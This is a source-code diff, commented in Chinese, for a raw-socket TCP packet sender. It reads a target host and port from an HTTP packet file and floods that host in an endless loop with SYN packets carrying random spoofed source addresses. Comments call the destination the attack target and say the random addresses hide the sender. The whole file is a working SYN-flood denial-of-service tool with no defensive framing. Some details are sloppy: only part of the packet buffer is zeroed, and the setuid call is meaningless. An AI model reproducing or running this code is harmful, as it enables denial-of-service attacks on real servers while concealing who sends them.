@@ -14,275 +14,109 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 
+#include "HTTPPack.h"
+
 using namespace std;
+using namespace proxyserver;
 
-/**************************** constants ***************************************/
-const int PACKET_BUFFER_LENGTH = 1000;
+#define DESTPORT 8080 
+#define LOCALPORT 8888
 
-const int IP_HEADER_LENGTH = sizeof(struct ip);
+const int packet_length = 1000;
 
-const int TCP_HEADER_LENGTH = sizeof(struct tcphdr);
+void setup_and_send_tcp_packet(const char *const file_path);
 
-const int LOCALPORT = 8888;
+void setup_socket(const char *const hostname, const int &hostport, int &sockfd, struct sockaddr_in &addr);
 
-
-/**************************** function definition *****************************/
-
-void setup_and_send_tcp_packet(const char *const &host_name, const int &host_port, const char *const file_path);
-
-FILE* open_file(const char *const &file_path); 
-
-bool read_packet_from_file(FILE* packet_file, size_t &buf_length, char *packet_buf, int &packet_length);
-
-void setup_socket(const char *const &hostname, const int &hostport, int &sockfd, struct sockaddr_in &addr);
-
-void send_tcp_packet(int sockfd, const struct sockaddr_in *const &addr, FILE *packet_file);
-
-void init_header(char * packet, const struct sockaddr_in * const &addr);
-
-void update_ip_address(char * packet);
-
-void fill_in_tcp_packet(char * packet, const char * const &source, int length);
+void send_tcp_packet(int sockfd, struct sockaddr_in *addr, FILE * packet_file, const HTTPPack &first_pack);
 
 unsigned short check_sum(unsigned short *addr, int len);
 
-/**************************** function implementation *************************/
+FILE* open_file(const char *const file_path); 
+
+bool read_packet_from_file(FILE* packet_file, size_t &buf_length, char *packet_buf);
 
 int main(int argc, char **argv) 
 {
-   if (argc != 4) 
+   if (argc != 2) 
    {
       fprintf(stderr,
-              "Usage:%s host_name host_port packet_file_path\n\a",
+              "Usage:%s packet_file_path\n\a",
               argv[0]);
       exit(1);
    }
 
-   setup_and_send_tcp_packet(argv[1], atoi(argv[2]), argv[3]);
+   setup_and_send_tcp_packet(argv[1]);
 
    return 0;
 }
 
 /***************************************************************************//**
-*  @brief setup, read and send TCP packet 
+* @brief setup, read and send tcp paket 
 *
-*  @param host_name  - [in]
-*  @param host_port  - [in]
-*  @param file_path  - [in]
+* @param file_path   - [in]
 ********************************************************************************/
 
 void setup_and_send_tcp_packet(
-   const char *const &host_name, 
-   const int &host_port, 
    const char *const file_path)
 {
+   int sockfd;
+   struct sockaddr_in addr;
    FILE *packet_file;
+   size_t packet_buf_length = packet_length;
+   char packet_buf[packet_length];
+
 
    //open file
    packet_file = open_file(file_path);
 
+   // get first http pack
+   read_packet_from_file(packet_file, packet_buf_length, packet_buf);
 
-   int sockfd;
-   struct sockaddr_in addr;
+   //buildup first http packet
+   HTTPPack first_pack(packet_buf);
 
-   setup_socket(host_name, 
-                host_port,
-                sockfd, 
-                addr);
+   if (first_pack.isValid()) 
+   {
+      setup_socket(first_pack.getHostName().c_str(), 
+                   first_pack.getHostPort(),
+                   sockfd, 
+                   addr);
 
-   // send the packet
-   send_tcp_packet(sockfd, 
-                   &addr, 
-                   packet_file);
+      // send the packet
+      send_tcp_packet(sockfd, &addr, packet_file, first_pack);
+   }
 
    fclose(packet_file);
 }
 
 /***************************************************************************//**
-*  @brief open file
+* @brief send tcp packet data
 *
-*  @param file_path  - [in]
-*
-*  @return file pointer
-*******************************************************************************/
-
-FILE* open_file(
-   const char * const &file_path)
-{
-   FILE *packet_file;
-
-   if (NULL == (packet_file = fopen(file_path, "rb"))) 
-   {
-      fprintf(stderr,"Open %s Error:%s\n", 
-              file_path, 
-              strerror(errno));
-      exit(-1);
-   }
-
-   return packet_file;
-}
-
-/***************************************************************************//**
-*  @brief read packet from file
-*
-*  @param packet_buf       - [out]
-*  @param buf_length       - [out]
-*  @param packet_buf       - [out]
-*  @param packet_length    - [out]
-*
-*  @return read result success or failure
-********************************************************************************/
-
-bool read_packet_from_file(
-   FILE     *packet_file,
-   size_t   &buf_length,
-   char     *packet_buf,
-   int      &packet_length)
-{
-   bool read_success = true;
-
-   packet_length = getline(&packet_buf, 
-                           &buf_length,
-                           packet_file);
-
-   if (EOF == packet_length)
-   {
-      fprintf(stdout,
-              "Read packet from file failure: %s\n", 
-              strerror(errno));
-      read_success = false;
-   }
-
-   return read_success;
-}
-
-/***************************************************************************//**
-*  @brief send tcp packet data
-*
-*  @param sockfd      - [in]
-*  @param addr        - [in]
-*  @param packet_file - [in]
-*  @param first_pack  - [in]
+* @param sockfd      - [in]
+* @param addr        - [in]
+* @param packet_file - [in]
+* @param first_pack  - [in]
 *******************************************************************************/
 
 void send_tcp_packet(
    int sockfd, 
-   const struct sockaddr_in *const &addr, 
-   FILE *packet_file)
+   struct sockaddr_in *addr, 
+   FILE * packet_file, 
+   const HTTPPack &first_pack)
 {
    // 放置数据包
-   char packet_buffer[PACKET_BUFFER_LENGTH];
+   char buffer[packet_length];
+   struct ip *ip;
+   struct tcphdr *tcp;
    int head_len;
 
    // 数据包没有任何内容,所以长度就是两个结构的长度
-   head_len = IP_HEADER_LENGTH + TCP_HEADER_LENGTH;
-   bzero(packet_buffer, PACKET_BUFFER_LENGTH);
-
-   init_header(packet_buffer, addr);
-
-   // read packets from file and send to the destination
-   char packet_data_buf[PACKET_BUFFER_LENGTH];
-   size_t packet_data_buf_length = PACKET_BUFFER_LENGTH;
-   int packet_data_length;
-
-   for (;;) 
-   {
-      //reread the packet file
-      fseek(packet_file, 0, SEEK_SET);
-
-      update_ip_address(packet_buffer);
-
-
-      read_packet_from_file(packet_file, 
-                            packet_data_buf_length, 
-                            packet_data_buf,
-                            packet_data_length);
-
-      // fill in first packet
-      fill_in_tcp_packet(packet_buffer + head_len,
-                         packet_data_buf,
-                         packet_data_length);
-
-      // send
-      sendto(sockfd,
-             packet_buffer,
-             head_len + packet_data_length,
-             0,
-             (struct sockaddr *)addr,
-             sizeof(struct sockaddr_in));
-   }
-}
-
-/***************************************************************************//**
-*  @brief initialize socket
-*
-*  @param hostname    - [IN]
-*  @param hostport    - [IN]
-*  @param sockfd      - [OUT]
-*  @param addr        - [OUT]
-*******************************************************************************/
-
-void setup_socket(
-   const char *const &hostname, 
-   const int &hostport,
-   int &sockfd, 
-   struct sockaddr_in &addr)
-{
-   struct hostent *host;
-   int on = 1;
-
-   addr.sin_family = AF_INET;
-   addr.sin_port = htons(hostport);
-
-   if (0 == inet_aton(hostname, &addr.sin_addr)) 
-   {
-      host = gethostbyname(hostname);
-      if(NULL == host) 
-      {
-         fprintf(stderr,
-                 "Host Name Error:%s\n\a",
-                 strerror(errno));
-         exit(1);
-      }
-      addr.sin_addr = *(struct in_addr *)(host -> h_addr);
-   }
-
-   // 使用 IPPROTO_TCP 创建一个 TCP 的原始套接字
-   sockfd =  socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
-   if (0 > sockfd) 
-   {
-      fprintf(stderr,
-              "Socket Error:%s",
-              strerror(errno));
-      exit(1);
-   }
-
-   // 设置 IP 数据包格式,告诉系统内核模块IP数据包由我们自己来填写
-   setsockopt(sockfd,
-              IPPROTO_IP,
-              IP_HDRINCL,
-              &on,
-              sizeof(on));
-   // 只有超级用户才能使用原始套接字
-   setuid(getpid());
-}
-
-/***************************************************************************//**
-*  @brief initialize IP and TCP packet header
-*
-*  @param packet  - [out]
-*  @param addr    - [in]
-*******************************************************************************/
-
-void init_header(char * packet, 
-                 const struct sockaddr_in * const &addr)
-{
-   struct ip *ip;
-   struct tcphdr *tcp;
-   int head_len = sizeof(struct ip) + sizeof(struct tcphdr);
+   head_len = sizeof(struct ip) + sizeof(struct tcphdr);
+   bzero(buffer, 100);
 
    // 填充数据包的头部
-   ip = (struct ip *)packet;
+   ip = (struct ip *)buffer;
    ip -> ip_v = IPVERSION;// IP 版本
    ip -> ip_hl = sizeof(struct ip) >> 2;// IP 数据包头部长度
    ip -> ip_tos = 0;// 服务类型
@@ -295,48 +129,29 @@ void init_header(char * packet,
    ip -> ip_dst = addr -> sin_addr; // 目的IP,攻击对像
 
    // 开始填充 TCP 数据包
-   tcp = (struct tcphdr *)(packet + IP_HEADER_LENGTH);
+   tcp = (struct tcphdr *)(buffer + sizeof(struct ip));
    tcp -> source = htons(LOCALPORT);
    tcp -> dest = addr -> sin_port;// 目的端口
    tcp -> seq = random();
    tcp -> ack_seq = 0;
    tcp -> doff = 5;
-   tcp -> syn = 0; // 建立连接
+   tcp -> syn = 1; // 建立连接
    tcp -> check = 0;
 
-   // 自己校验头部,可有可无的头部
-   tcp -> check = check_sum((unsigned short *)tcp,
-                            sizeof(struct tcphdr));
-}
+   // 填充完毕,开始攻击
+   for (;;) {
+      // 用随机数隐藏IP
+      ip -> ip_src.s_addr = random();
+      // 自己校验头部,可有可无的头部
+      tcp -> check = check_sum((unsigned short *)tcp,
+                               sizeof(struct tcphdr));
 
-/***************************************************************************//**
-*  @brief upadte IP address in IP header
-*
-*  @param packet  - [out]
-********************************************************************************/
-
-void update_ip_address(char * packet)
-{
-   struct ip *ip;
-
-   ip = (struct ip *)packet;
-   // 用随机数隐藏IP
-   ip -> ip_src.s_addr = random();
-}
-
-/***************************************************************************//**
-* @brief fill in tcp packet
-*
-* @param packet   - [out]
-* @param source   - [in]
-* @param length   - [in]
-********************************************************************************/
-
-void fill_in_tcp_packet(char * packet, const char * const &source, int length)
-{
-   strncpy(packet, 
-           source, 
-           length);
+      // send
+      sendto(sockfd,buffer,head_len,
+             0,
+             (struct sockaddr *)addr,
+             sizeof(struct sockaddr_in));
+   }
 }
 
 // 首部校验和算法 
@@ -366,5 +181,114 @@ unsigned short check_sum(
    answer = ~sum;
 
    return(answer);
+}
+
+/***************************************************************************//**
+*
+* @brief initialize socket
+*
+* @param hostname    - [IN]
+* @param hostport    - [IN]
+* @param sockfd      - [OUT]
+* @param addr        - [OUT]
+*******************************************************************************/
+
+void setup_socket(
+   const char *const hostname, 
+   const int &hostport,
+   int &sockfd, 
+   struct sockaddr_in &addr)
+{
+   struct hostent *host;
+   int on = 1;
+
+   bzero(&addr,sizeof(struct sockaddr_in));
+   addr.sin_family = AF_INET;
+   addr.sin_port = htons(hostport);
+
+   if (0 == inet_aton(hostname, &addr.sin_addr)) 
+   {
+      host = gethostbyname(hostname);
+      if(NULL == host) 
+      {
+         fprintf(stderr,
+                 "HostName Error:%s\n\a",
+                 strerror(h_errno));
+         exit(1);
+      }
+      addr.sin_addr = *(struct in_addr *)(host -> h_addr);
+   }
+
+   // 使用 IPPROTO_TCP 创建一个 TCP 的原始套接字
+   sockfd =  socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
+   if (0 > sockfd) 
+   {
+      fprintf(stderr,
+              "Socket Error:%s",
+              strerror(errno));
+      exit(1);
+   }
+
+   // 设置 IP 数据包格式,告诉系统内核模块IP数据包由我们自己来填写
+   setsockopt(sockfd,
+              IPPROTO_IP,
+              IP_HDRINCL,
+              &on,
+              sizeof(on));
+   // 只有超级用户才能使用原始套接字
+   setuid(getpid());
+}
+
+/***************************************************************************//**
+*  @brief open file
+*
+*  @param file_path [in]
+*
+*  @return file fd
+*******************************************************************************/
+
+FILE* open_file(
+   const char * const file_path)
+{
+   FILE *packet_file;
+
+   if (NULL == (packet_file = fopen(file_path, "r"))) 
+   {
+      fprintf(stderr,"Open %s Error:%s\n", 
+              file_path, 
+              strerror(errno));
+      exit(-1);
+   }
+
+   return packet_file;
+}
+
+/***************************************************************************//**
+* @brief read packet from file
+*
+* @param fild_fd     - [in]
+* @param buf_length  - [out]
+* @param packet_buf  - [out]
+*
+* @return status(success or not)
+********************************************************************************/
+
+bool read_packet_from_file(
+   FILE* packet_file,
+   size_t &buf_length,
+   char * packet_buf)
+{
+   bool read_success = true;
+
+   if (EOF == getline(&packet_buf, 
+                      &buf_length,
+                      packet_file))
+   {
+      fprintf(stderr,"Read packet from file failure. Error:%s\n", 
+              strerror(errno));
+      read_success = false;
+   }
+
+   return read_success;
 }
 
